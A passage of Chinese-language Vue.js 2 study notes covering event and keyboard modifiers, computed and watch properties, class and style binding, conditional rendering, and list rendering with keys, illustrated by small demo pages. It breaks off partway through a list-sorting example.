<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Title</title>
		<script src="js/vue.js"></script>
		<style>
			.list {
				width: 200px;
				height: 200px;
				background-color: #b3d4fc;
				overflow: auto;
			}
			li {
				height: 100px;
			}

		</style>
	</head>
	<body>
	<div id="app">
		<h2>{{name}}</h2>
		<ul class="list" @scroll="showInfo">
			<li>1</li>
			<li>2</li>
			<li>3</li>
			<li>4</li>
		</ul>
	</div>

		<script>
			Vue.config.productionTip = false

			const vm = new Vue({
				el: '#app',
				data: {
					name: 'sai',
				},
				methods: {
					showInfo(){
						console.log('scroll')
					}
				}
			})

		</script>
	</body>
</html>

```

效果：

![image-20220512212041826](image-20220512212041826.png)

和滚动条类似，还可以给鼠标滚轮，绑定滚动事件

```html
	<ul class="list" @wheel="showInfo">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
	</ul>
```

鼠标滚轮每滚动一次，调用一次回调，当滚动条到达末端，再按滚轮时，事件回调仍会触发

引出`passive`：如果滚动事件的回调是执行了很复杂（耗时）的运算，那么页面滚动时，可能要等到计算完之后才会滚动（执行默认行为）

```js
            showInfo() {
                for (let i = 0; i < 10000; i++) {
                    console.log('#')
                }
            }
```

我们可以添加`passive`修饰符，优先执行默认行为，再执行事件回调，这样可以保证页面不卡顿



```html
   <ul class="list" @wheel.passive="showInfo">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
```

但是要注意，不是所有的事件都会存在`回调函数先调用，后执行默认行为`的问题，上面的案例中`scroll`事件就不会卡顿

### 1.9.7.小结：事件修饰符

- `prevent`：阻止绑定事件的标签上的默认事件
  - 阻止元素的默认回调
- `stop`：阻止事件冒泡
  - 只希望内层元素的回调被执行
- `once`：事件只触发一次
  - 回调函数只执行一次
- `capture`：使用事件的捕获模式
  - 希望外层元素的回调优先执行
- `self`：只有`event.target`是当前操作的元素时才触发事件
  - 只发生在自身时执行回调（忽略捕获/冒泡）
- `passive`：事件的默认行为立即执行，无需等待事件回调执行完毕
  - 优先执行元素的默认回调
- 修饰符可以连续写
  - `@click.stop.prevent = "showInfo"`


## 1.10.键盘事件

使用：

- 使用`vue`提供的别名：`@keyup.enter = "showInfo"`

  - 额外注意`tab`：按下时就会切换焦点，不适合用`keyup`，得用`keydown`

- 使用`js`原生提供的名称：`@keyup.Shift = "shoInfo"`

  - 如果按键的`key`是单词组成，绑定事件时，需要都转为小写，并且用`-`分隔：`@keyup.caps-lock = "showInfo"`
  - 有些按键是不可以绑定事件的

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Title</title>
      <script src="js/vue.js"></script>
      <style>
  
      </style>
  </head>
  <body>
  <div id="app">
      <h2>{{name}}</h2>
      <input type="text" @keyup="showInfo">
  </div>
  
  <script>
      Vue.config.productionTip = false
  
      const vm = new Vue({
          el: '#app',
          data: {
              name: 'sai',
          },
          methods: {
              showInfo(e) {
                  console.log(e.key, e.keyCode)
              }
          }
      })
  
  </script>
  </body>
  </html>
  
  ```

  ![image-20220513141036737](image-20220513141036737.png)

- 系统修饰键（用法特殊）：`ctrl`、`alt`、`shift`、`meta`

  - 配合`keyup`使用：按下`修饰键`的同时，再按下其他键，事件才被触发
  - 配合`keydown`使用：正常触发事件

- 也可以使用`keyCode`去指定具体的按键（不推荐）

  - `MDN`上已经移除该特性了
  - 不同键盘上的`keyCode`对应的实际按键可能不一样

### 小结：键盘事件

- `Vue`中常用的按键别名：
  - 回车：`enter`
  - 删除：`delete`，捕获`删除`和`退格键`
  - 退出：`esc`
  - 空格：`space`
  - 换行：`tab`，搭配`keydown`
  - 上：`up`
  - 下：`down`
  - 左：`left`
  - 右：`right`

- `Vue`未提供别名的按键，可以通过按键原始`key`值去绑定，但注意要转为`kebab-case`（短横线命名）
- 系统修饰键（用法特殊）：`ctrl`、`alt`、`shift`、`meta`
  - 配合`keyup`使用：按下`修饰键`的同时，再按下其他键，事件才被触发，
    - 系统修饰符后面，可以再指定`其他键`：`@keyup.ctrl.y = "showInfo"`

  - 配合`keydown`使用：正常触发事件

- 也可以使用`keyCode`去指定具体的按键（不推荐）
- `Vue.config.keyCode.自定义键名 = 键码`，可以去定制按键别名

## 1.11.计算属性与监视属性

### 1.11.1.计算属性

#### 1.11.1.1.小案例

- 需求一：拼接姓名

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Title</title>
      <script src="js/vue.js"></script>
      <style>
      </style>
  </head>
  <body>
  <div id="app">
      <h2>{{name}}</h2>
      姓：<input type="text" v-model="firstName"><br/><br/>
      名：<input type="text" v-model="lastName"><br/><br/>
      全名：<span>{{firstName}} - {{lastName}}</span>
  </div>
  
  <script>
      Vue.config.productionTip = false
  
      const vm = new Vue({
          el: '#app',
          data: {
              name: 'sai',
              firstName: '张',
              lastName: '三'
          },
      })
  
  </script>
  </body>
  </html>
  
  ```

  ![image-20220513144313100](image-20220513144313100.png)

- 需求二：不论姓输入多少，只取前3位，之后再拼接

  ```html
      全名：<span>{{firstName.slice(0,3)}} - {{lastName}}</span>
  ```

  ![image-20220513144414657](image-20220513144414657.png)

- 改进：

  - 我们在插值语法里，写了太多的内容，需要封装一下

  - 先使用`methods`进行封装

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Title</title>
        <script src="js/vue.js"></script>
        <style>
    
        </style>
    </head>
    <body>
    <div id="app">
        <h2>{{name}}</h2>
        姓：<input type="text" v-model="firstName"><br/><br/>
        名：<input type="text" v-model="lastName"><br/><br/>
        全名：<span>{{fullName()}}</span>
    </div>
    
    <script>
        Vue.config.productionTip = false
    
        const vm = new Vue({
            el: '#app',
            data: {
                name: 'sai',
                firstName: '张',
                lastName: '三'
            },
            methods: {
                fullName() {
                    return this.firstName.slice(0, 3) + '-' + this.lastName
                }
            }
        })
    
    </script>
    </body>
    </html>
    
    ```

    

- 注意点：

  - 只要`data`中的数据发生改变，`vue`一定会重新解析模板，这样才可以知道模板中那些地方用到了`姓`，然后进行更新

  - 当读取到`插值语法里面写方法`的情况，一定也会重新调用

    - 这样`姓`每输入一次，插值语法里`fullName`方法就会被调用一次

      ![image-20220513144847991](image-20220513144847991.png)

#### 1.11.2.2.计算属性

- 要显示的数据不存在，要通过计算得来
  - 案例的需求二中的`取前3位`，就是`计算`
  
- 在`computed`对象中定义计算属性
  - 计算属性，就是拿到你已经有的属性，去加工、计算成新的属性
    - 也可以拿到`vuex`里面的属性
  
  - 写法：
  
    - 计算属性也是属性，但不能写在`data`配置项中，需要新增`computed`配置项。那我们能不能像`data`里的那种写法呢？
  
      ```js
         const vm = new Vue({
              el: '#app',
              data: {
                  name: 'sai',
                  firstName: '张',
                  lastName: '三'
              },
              computed: {
                  fullName: 'test'
              }
          })
      ```
  
      这样写会提示缺少`getter`、并且要写成函数的形式：
  
      ![image-20220514150448349](image-20220514150448349.png)
  
    - 正确的写法：要把真正要计算的属性值，写成一个对象，对象里有一个`get`
  
      - `get`：当有人读取`fullName`时，`get`就会被调用，且返回值就是`fullName`的值
  
        ```html
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Title</title>
            <script src="js/vue.js"></script>
            <style>
        
            </style>
        </head>
        <body>
        <div id="app">
            <h2>{{name}}</h2>
            姓：<input type="text" v-model="firstName"><br/><br/>
            名：<input type="text" v-model="lastName"><br/><br/>
            全名：<span>{{fullName}}</span>
        </div>
        
        <script>
            Vue.config.productionTip = false
        
            const vm = new Vue({
                el: '#app',
                data: {
                    name: 'sai',
                    firstName: '张',
                    lastName: '三'
                },
                computed: {
                    fullName: {
                        get() {
                            console.log('fullName的get被调用了')
                            return 'getValue'
                        }
                    }
                }
            })
        
        </script>
        </body>
        </html>
        
        ```
  
        ![image-20220516140910007](image-20220516140910007.png)
  
      - `vm`实例上`_data`有`data`里面定义的值，但是没有计算属性的值的，真正要用到计算属性时，会拿到`_data`里面的值经过一系列计算后的返回值，挂载在`vm`实例上。也就是说可以通过插值语法读取到，并且不需要显示调用`get`。
  
      - `get`函数中的`this`，`vue`已经帮我们维护好了，指向的就是`vm`实例对象，完整写法：
  
        ```js
                    fullName: {
                        get() {
                            console.log('fullName的get被调用了')
                            return this.firstName + '-' + this.lastName // 
                        }
                    }
        ```
  
      - 我们多调用几次计算属性：
  
        ```html
            全名：<span>{{fullName}}</span><br/><br/>
            全名：<span>{{fullName}}</span><br/><br/>
            全名：<span>{{fullName}}</span><br/><br/>
        ```
  
        不同于之前`methods`的写法，这里控制台语句只打印了一次
  
        ![image-20220516142332003](image-20220516142332003.png)
  
        是因为`vue`帮我们把计算属性做了缓存，当模板解析遇到第二次`fullName`时，不会再走`getter`了， 而是直接取缓存里的值，那么缓存的值咋更新呢？
  
        所以计算属性的`get`函数真正被调用的情况有两种：
  
        - 初次读取计算属性时
        - 所依赖的数据发生变化时
  
      - `set`：如果不配置`set`，而去直接修改计算属性，会报如下错误：
  
        ![image-20220516144049567](image-20220516144049567.png)
  
        所以当计算属性被修改时，调用`set`，我们在`set`函数里更新计算属性的依赖
  
        ```js
                        set(value) {
                            console.log('fullName的set被调用了')
                            this.firstName = value.split('-')[0]
                            this.lastName = value.split('-')[1]
                        }
        ```
  
        ![image-20220516144917339](image-20220516144917339.png)

#### 1.11.2.3.计算属性简写形式

如果计算属性只考虑展示，确定不会修改的话，即只调用`get`时，可以简写：

`fullName`就不用再写成对象的形式，写成函数形式当作`getter`使用

```js
        computed: {
            fullName() {
                console.log('fullName的get被调用了')
                return this.firstName + '-' +this.lastName
            }
        }
```

注意：插值语法里调用的时候，不要写成`{{fullName()}}`的形式，计算属性最终会在`vm`上挂载一个`fullName`属性的，直接写成`{{fullName}}`即可

#### 1.11.2.4.小结：计算属性

- 定义：要用的属性不存在，要通过已有属性计算得来
- 原理：底层借助了`Object.defineproperty`方法提供的`getter`和`setter`
- `get`函数什么时候执行
  - 初次读取时，会执行一次
  - 当依赖的数据发生改变时会被再次调用
- 优势：与`methods`实现相比，模板重复解析时，内部有缓存机制（复用），效率更高，调试方便
- 备注：
  - 计算属性最终会出现`vm`身上，直接读取使用即可
  - 如果计算属性要被修改，那必须写`set`函数去响应修改，且`set`中要修改计算属性依赖的相关变量



### 1.11.2.监视属性

#### 1.11.2.1.小案例

点击按钮实现天气切换

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>{{name}}</h2>
    <h3>今天天气很{{info}}</h3>
    <button @click="changeWeather">改变天气</button>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai',
            isHot: true
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot
            }
        }
    })

</script>
</body>
</html>

```

![image-20220516152531833](image-20220516152531833.png)

#### 1.11.2.2.监视属性

- 通过`vm`对象的`$watch()`或`watch`配置来指定监视指定的属性
- 当属性发生变化时，回调函数自动调用，在函数内部进行计算

新需求：检测`isHot`的改变

要想实现监视，需要添加新的配置字段`watch`，值是一个对象，再添加需要监视的属性

`handler`配置项：

里面有一个`handler`函数：当`isHot`发生改变时，`handler`函数被调用

```js
        watch: {
            isHot: {
                handler() {
                    console.log('handler被调用了')
                }
            }
        }
```

并且，`handler`函数有两个参数，分别对应`修改后的值`、`修改前的值`

这样我们就可以对数据进行监测，再进行对比，然后实现对应的业务逻辑

```js
            isHot: {
                handler(newValue, oldValue) {
                    console.log(newValue, oldValue)
                }
            }
```

![image-20220516153423522](image-20220516153423522.png)

`immediate`配置项：

- `immediate: true`

  - 初始化加载时，就调用一下`handler`函数

    ![image-20220516153726615](image-20220516153726615.png)

- `immediate: false`

  - 默认值

除了`data`里面的属性可以监视，`computed`计算属性里面的属性，也是可以监视的

监视计算属性：

```js
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽'
            }
        },
        watch: {
            info: {
                handler(newValue, oldValue) {
                    console.log(newValue, oldValue)
                }
            }
        }
```

![image-20220516154034864](image-20220516154034864.png)

第二种配置监视属性的方式：`$watch()`

前提：`vm`实例创建完毕后

`vm.$watch(attr<string>, options<Object>)`

```js
    vm.$watch('isHot', {
        immediate: true,
        handler(newValue, oldValue) {
            console.log(newValue, oldValue)
        }
    })
```

同样可以实现监视

如果`attr`监视的属性不存在时，不会报错，但没有意义



- 如果一开始就很明确监视的属性，可以在`watch`配置项里进行监视

- 如果是在后续的过程中，有了监视的需求，可以调用`$watch()`进行监视



#### 1.11.2.3.深度监视

现在有这么个数据结构：

```js
numbers: {
    a: 1,
    b: 1
}
```

想要监视`numbers`里面的`a`的变化

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>{{name}}</h2>
    <h3>{{numbers.a}}</h3>
    <button @click="numbers.a++">a的值+1</button>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai',
            numbers: {
                a: 1,
                b: 2
            }
        },
        watch: {
            'numbers.a': {
                handler(newValue, oldValue) {
                    console.log(newValue, oldValue)
                }
            }
        }
    })
</script>
</body>
</html>

```

![image-20220516155521141](image-20220516155521141.png)

监视多级结构中某个属性的变化，需要写成`numbers.a`的形式，注意这里的`key`要写成原始带引号的形式

如果`numbers`里有一百个属性，我们不可能写一百遍

如果直接监视的是最外层的数据`numbers`，则修改里面的`a`或`b`的值时，`vue`认为`numbers`是没有变化的，因为其的数据地址并没有变，除非将`numbers`整个赋值替换

```js
watch: {
    numbers: {
        handler(newValue, oldValue) {
            console.log(newValue, oldValue)
        }
    }
}
```

执行`numbers.a++`或`numbers.b++`，并不会调用`numbers`的`handler`回调函数

只要新增`deep`配置项即可监视多级结构中所有属性的变化：

```js
watch: {
    numbers: {
        deep: true, // 开启深度监视
        handler(newValue, oldValue) {
            console.log(newValue, oldValue)
        }
    }
}
```

##### 小结：深度监视

- `Vue`中的`watch`默认不监视对象内部值的改变（一层）
- 配置`deep: true`可以监测对象内部值的改变（多层）
- 备注：
  - `Vue`自身是可以监测对象内部值的改变，但`Vue`提供的`watch`默认是不可以
  - 使用`watch`时，根据数据的具体结构，决定是否采取深度监视

#### 1.11.2.3.监视属性简写形式

如果不需要深度监视，也不需要初始化调用`handler`时，就可以采取简写形式

```js
        watch: {
            isHot(newValue, oldValue) {
                console.log(newValue, oldValue)
            }
        }
```

将监视属性写成函数形式，就相当于`handler`函数

同理，`$watch`的可以简写成如下形式：

```js
    vm.$watch('isHot', function (newValue, oldValue) {
        console.log(newValue, oldValue)
    })
```

注意不要写成箭头函数，会导致`this`指向问题，再次说明所有由`vue`管理的函数，都需要写成普通函数

### 1.11.3.`watch`对比`computed`

用`watch`来实现拼接姓名的案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>{{name}}</h2>
    姓： <input type="text" v-model="firstName"><br>
    名： <input type="text" v-model="lastName"><br>
    全名： <input type="text" v-model="fullName"><br>

</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai',
            firstName: '张',
            lastName: '三',
            fullName: '张三'
        },
        watch: {
            firstName(newValue) {
                this.fullName = newValue + '-' + this.lastName
            },
            lastName(newValue) {
                this.fullName = this.firstName + '-' + newValue
            }
        }
    })



</script>
</body>
</html>

```

![image-20220516164553741](image-20220516164553741.png)

此案例中，`watch`相比较于`computed`，使用命令式编码方式，重复代码较多，不够简洁



新需求：当`firstName`发生改变时，延迟一秒进行拼接

在`watch`里面可以非常畅快的进行异步操作：

```js
        watch: {
            firstName(newValue) {
                setTimeout(() => {
                    this.fullName = newValue + '-' + this.lastName
                }, 1000)
            },
            lastName(newValue) {
                this.fullName = this.firstName + '-' + newValue
            }
        }
```

但是在`computed`里面是不行的

```js
computed: {
    fullName() {
        setTimeout(() => {
            return this.firstName + '-' + this.lastName
        }, 1000) // 定时器的回调函数，并不是vue实例管理的，所以可以写成箭头函数，并且如果不写成箭头函数的话，内部的this就指向了window
    }
}
```

这个就是基础的问题了，`return`是回调函数的返回值，此时`fullName`并没有返回值。

计算属性是不能开启异步任务来维护数据的



#### 1.11.3.1.小结：`watch`对比`computed`

区别：

- `computed`能完成的功能，`watch`都可以完成
- `watch`能完成的功能，`computed`不一定能完成，如`watch`可以有异步操作

原则：

- 所有被`Vue`管理的函数，最好写成普通函数，这样`this`的指向才是`vm`或组件实例对象
- 所有不被`Vue`管理的函数，如定时器的回调函数，`ajax`的回调函数，最好写成箭头函数，这样`this`的指向才是`vm`或组件实例对象

## 1.12.`class`与`style`绑定

- 在应用界面中，某些（个）元素的样式是变化的
- `class/style`绑定，就是专门用来实现`动态样式效果`的技术

### 1.12.1.`class`绑定

给`div.normal`绑定样式：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>
        .normal {
            width: 200px;
            height: 100px;
            border: 1px solid black;
        }
    </style>
</head>
<body>
<div id="app">
    <h2>{{name}}</h2>
    <div class="normal"></div>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai'
        },
    })


</script>
</body>
</html>

```

![image-20220516185126950](image-20220516185126950.png)

#### 1.12.1.1.字符串写法

适用于：样式的类名不确定，需要动态指定

- 基本流程

  - 1.预先定义类名及样式

    ```css
            .bg-green {
                background-color: rgba(116, 236, 180, 0.56);
            }
    ```

  - 2.定义变量，值为第一步的类名

    ```js
            data: {
                bgGreen: 'bg-green'
            },
    ```

  - 3.使用`v-bind`绑定`class`，值为定义的变量

    ```html
        <div class="normal" :class="bgGreen"></div>
    ```

  - 效果：

    ![image-20220516185103401](image-20220516185103401.png)

- 切换单个样式

  - 定义好多个类名，对应不同的样式

    ```css
            .bg-green {
                background-color: rgba(116, 236, 180, 0.56);
            }
            .border {
                border-radius: 5px;
            }
            .shadow {
                box-shadow: 2px 2px 5px #c3d2e3;
            }
    ```

  - 添加点击事件，随机切换样式

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Title</title>
        <script src="js/vue.js"></script>
        <style>
            .normal {
                width: 200px;
                height: 100px;
                border: 1px solid black;
            }
            .bg-green {
                background-color: rgba(116, 236, 180, 0.56);
            }
            .border {
                border-radius: 5px;
            }
            .shadow {
                box-shadow: 2px 2px 5px #c3d2e3;
            }
        </style>
    </head>
    <body>
    <div id="app">
        <h2>{{name}}</h2>
        <div class = 'normal' :class="myClass" @click="changeClass"></div>
    </div>
    
    <script>
        Vue.config.productionTip = false
    
        const vm = new Vue({
            el: '#app',
            data: {
                name: 'sai',
                myClass: ''
            },
            methods: {
                changeClass() {
                    const arr = ['bg-green', 'border', 'shadow']
                    const index = Math.floor(Math.random()*3)
                    this.myClass = arr[index]
                }
            }
        })
    
    
    </script>
    </body>
    </html>
    
    ```

- 目标元素将来可能需要绑定一个，或一个以上的样式，见下一小节

#### 1.12.1.2.数组写法

应用场景：目标元素将来可能需要绑定一个，或一个以上的样式

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>
        .normal {
            width: 200px;
            height: 100px;
            border: 1px solid black;
        }
        .bg-green {
            background-color: rgba(116, 236, 180, 0.56);
        }
        .border {
            border-radius: 5px;
        }
        .shadow {
            box-shadow: 2px 2px 5px #c3d2e3;
        }
    </style>
</head>
<body>
<div id="app">
    <h2>{{name}}</h2>
    <div class="normal" :class="arr"></div>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai',
            arr: ['bg-green','border','shadow']
        },
    })
</script>
</body>
</html>

```

要绑定样式的个数不确定，名字也不确定，适合用数组写法

#### 1.12.1.3.对象写法

绑定的样式个数确定，名字也确定，只是不确定用不用的时候，适合用对象写法

```html
    <div class="normal" :class="arr"></div>
```

`arr`是个对象

```js
        data: {
            name: 'sai',
            arr: {
                'bg-green': true, // 如果类名是分段的，记得key加引号
                border: false,
                shadow: true
            }
        },
```



### 1.12.2.`style`绑定

绑定`style`样式的对象写法

```html
	<div class="normal" :style="styleObj">Hello</div>
```



```js
data() {
    return {
        styleObj: {
            fontSize: '40px', // 注意key用小驼峰命名，key对应css中的属性
            backgroundColor: 'blue' 
        },
    }
}
```

绑定`style`样式的数组写法（比较少见） 

```html
    <div class="normal" :style="[styleObj1, styleObj2]">Hello</div>
```



```js
        data: {
            styleObj1: {
                backgroundColor: 'blue'
            },
            styleObj2: {
                fontSize: '40px'
            },
        },
```

也可以写成：

```html
<div class="normal" :style="styleArr">Hello</div>
```



```js
        data: {
            styleArr: [
                {
                    fontSize: '40px',
                    color: 'red'
                },
                {
                    backgroundColor: 'blue'
                }
            ]
        },
```

`style`的写法可以通过三元表达式来动态控制样式

```html
<div class="item-list clearfix" :style="{display: currentIndex==index ? 'block': 'none'}">

</div>
```



### 1.12.3.小结：样式绑定

`class`样式

- 写法：`:class="xxx"`，`xxx`可以是字符串、对象、数组
  - 字符串写法适用于：类名不确定，要动态获取
  - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定
  - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用

`style`样式

- `:style="{fontSize: xxx}"`，其中`xxx`是动态值
- `:style=[a, b]`，其中`a`、`b`是样式对象

## 1.13.条件渲染

### 1.13.1.条件渲染指令

#### 1.13.1.1.`v-show`

通过控制`display`属性，来实现元素的显示与隐藏

![image-20220520150023941](image-20220520150023941.png)

使用布尔值：

```html
    <h2 v-show="false">{{name}}</h2>
```

使用能转为布尔值的表达式：

```html
    <h2 v-show="1 === 3">{{name}}</h2>
```

#### 1.13.1.2.`v-if`

通过注释的形式，结构消失的很彻底

![image-20220520150438839](image-20220520150438839.png)

使用布尔值：

```html
	<h2 v-if="false">{{name}}</h2>
```

使用能转为布尔值的表达式：

```html
    <h2 v-show="1 === 3">{{name}}</h2>
```

#### 1.13.1.3.动态控制元素的显示和隐藏

```html
    <button @click="n++">+</button>
    <button @click="n--">-</button>
    <h2>n的值为：{{n}}</h2>
    <h2 v-show="n===1">vue</h2>
    <h2 v-show="n===2">react</h2>
    <h2 v-show="n===3">angluar</h2>
```



![image-20220520151211090](image-20220520151211090.png)

![image-20220520151228232](image-20220520151228232.png)



备注：如果存在多个判断，建议使用`v-if`、`v-else-if`，但是，如果切换的频率较快，建议使用`v-show`

如果条件结构中包含多个`dom`，一般想到的是用一个大的`div`包裹一下，但会多出来一个`dom`节点

```html
    <div v-show="n===1">
        <h2>vue</h2>
        <h2>react</h2>
        <h2>angluar</h2>
    </div>
```

![image-20220520152548423](image-20220520152548423.png)

可以使用`template`来包裹，这样渲染时就不会多出来一个节点了，但是要注意`template`只能和`v-if`配合使用

```html
    <div v-if="n===1">
        <h2>vue</h2>
        <h2>react</h2>
        <h2>angluar</h2>
    </div>
```

![image-20220520152500862](image-20220520152500862.png)

### 1.13.2.小结：条件渲染

`v-if`

- 写法：
  - `v-if="表达式"`
  - `v-else-if="表达式"`
  - `v-else="表达式"`
- 适用于：切换频率较低的场景
- 特点：不展示的`Dom`直接被移除
- 注意：`v-if`可以和`v-else-if`、`v-else`一起使用，但要求结构不能被“打断”

`v-show`

- 写法：
  - `v-show="表达式"`
  - 适用于：切换频率较高的场景
  - 特点：不展示的`Dom`未被移除，仅仅是使用样式隐藏掉

备注：

使用`v-if`时，如果判断值为`false`，元素无法获取到，而使用`v-show`一定可以获取到节点元素

## 1.14.列表渲染

### 1.14.1.`v-for`基本使用

`v-for`

- 使用`v-for`渲染时，必须指定`key`作为唯一标识，其值可以用`index`，也可以用原数据的`id`
- 只有两个形参
- 遍历数组：`v-for="(item, index) in arr" :key=index`
- 遍历对象：`v-for="(value, key) of obj" :key=key`
- 遍历字符串：`v-for="(char, index) of str" :key=index`
- 遍历指定次数：`v-for="(number, index) of 5" :key=index`

```html
<ul>
    <li v-for="(item, index) in person" :key=item.id></li>
</ul>
```

###  1.14.2.`key`的作用与原理

相关面试题：

写了`key`和不写`key`时，`vue`是如何处理的？



`key`的作用：

- 给节点做一个标识，相当于身份证号



以`index`作为`key`导致的问题：

在原数据中新增时，会出现错位的情况

![image-20220520164318246](image-20220520164318246.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>人员遍历</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <li v-for="(item, index) of persons" :key="index">
            {{item.name}} - {{item.age}}
            <input type="text">
        </li>
    </ul>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: 'sai',
            persons: [
                {id: '001', name: '张三', age: 18},
                {id: '002', name: '李四', age: 19},
                {id: '003', name: '王五', age: 20},
            ]
        },
        methods: {
            add() {
                const p = {id: '004', name: '老刘', age: 21}
                this.persons.unshift(p)
            }
        }
    })


</script>
</body>
</html>

```

当绑定的`key`是`item.id`时，就不会出现这个问题，因为此时用的是`数据的唯一标识`

那么不写`key`呢？也会有错位的问题



想弄清楚这个问题，需要理解`key`的工作原理，以及虚拟`dom`的`diff`算法

新旧虚拟`dom`在进行对比时，依赖的是`key`

- 在新的虚拟`dom`和旧的虚拟`dom`中，寻找`key`是一样的内容

  - 匹配到两个`key`一样的虚拟`dom`之后，接着对比里面的每一个节点，对于不一样的虚拟节点，最终会重新渲染成真实`dom`

  - 由于`input`在虚拟`dom`对比时，被认为是一样的，所以并不会重新渲染，而是会复用

    <img src="image-20220520171832234.png" alt="image-20220520171832234" style="zoom:80%;" />

  - 如果对数据进行了破坏顺序的操作，使用`index`作用`key`可能会导致如上问题，并且没有做到完全复用，效率较低
  - 如果用`id`作为`key`，在虚拟`dom`中，新增的`key`不会和历史虚拟`dom`中的`key`重复，也就没有问题

  - 如果遍历列表时，没有指定`key`，`vue`会将索引值自动作为`key`

所以在绑定`key`时，用数据的唯一标识即可

### 1.14.3.小结：列表渲染

- 虚拟`dom`中`key`的作用
  - `key`是虚拟`dom`对象的唯一标识，当状态中的数据发生变化时，`vue`会根据`新数据`生成新的虚拟`dom`
  - 随后`vue`进行`新虚拟dom`和`旧虚拟dom`的差异对比，比较规则如下
- 对比规则：
  - 旧的虚拟`dom`中找到了与新的虚拟`dom`中相同的`key`
    - 若虚拟`dom`中内容没变，直接使用之前的真实`dom`
    - 若虚拟`dom`中内容变了，则生成新的真实`dom`，随后替换掉页面中的真实`dom`
  - 旧的虚拟`dom`中未找到与新的虚拟`dom`中相同的`key`
    - 创建新的真实`dom`，随后渲染到页面
- 用`index`作为`key`可能会引发的问题：
  - 若对数据进行：逆序添加、逆序删除等破坏顺序的操作
    - 会产生没有必要的真实`dom`更新，界面效果没问题，但是效率低
  - 如果结构中还包括输入类的`dom`
    - 会产生错误`dom`更新，界面会有问题
- 开发中如何选择`key`
  - 最好使用每条数据的唯一标识作为`key`，比如`id`、手机号、身份证号、学号等唯一值
  - 如果不存在对数据的逆序添加、逆序删除等破坏顺序的，仅用于渲染列表用于展示，使用`index`作为`key`是没有问题的

### 1.14.4.列表过滤

使用`watch`实现

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>列表过滤</h2>
    <input type="text" v-model="name">
    <ul>
        <li v-for="(item, index) of filPersons">{{item.name}} - {{item.age}} - {{item.sex}}</li>
    </ul>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: '',
            persons: [
                {id: '001', name: '张三', age: 18, sex: '女'},
                {id: '002', name: '张四', age: 19, sex: '女'},
                {id: '003', name: '王四', age: 20, sex: '男'},
                {id: '003', name: '王五', age: 20, sex: '男'},
            ],
            filPersons: []
        },
        watch: {
            name: {
                immediate: true, // 空字符串在任何在任何字符串内
                handler(newValue) {
                    this.filPersons = this.persons.filter(item => {
                        return item.name.indexOf(newValue) !== -1
                    })
                }
            }
        }
    })


</script>
</body>
</html>

```

使用`computed` 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>列表过滤</h2>
    <input type="text" v-model="name">
    <ul>
        <li v-for="(item, index) of filPersons">{{item.name}} - {{item.age}} - {{item.sex}}</li>
    </ul>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: '',
            persons: [
                {id: '001', name: '张三', age: 18, sex: '女'},
                {id: '002', name: '张四', age: 19, sex: '女'},
                {id: '003', name: '王四', age: 20, sex: '男'},
                {id: '004', name: '王五', age: 20, sex: '男'},
            ],
        },
        computed: {
            filPersons() {
                return this.persons.filter(item => {
                    return item.name.indexOf(this.name) !== -1
                })
            }
        }
    })


</script>
</body>
</html>

```

### 1.14.5.列表排序

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2>列表过滤</h2>
    <input type="text" v-model="name">
    <button @click="sortType=2">年龄升序</button>
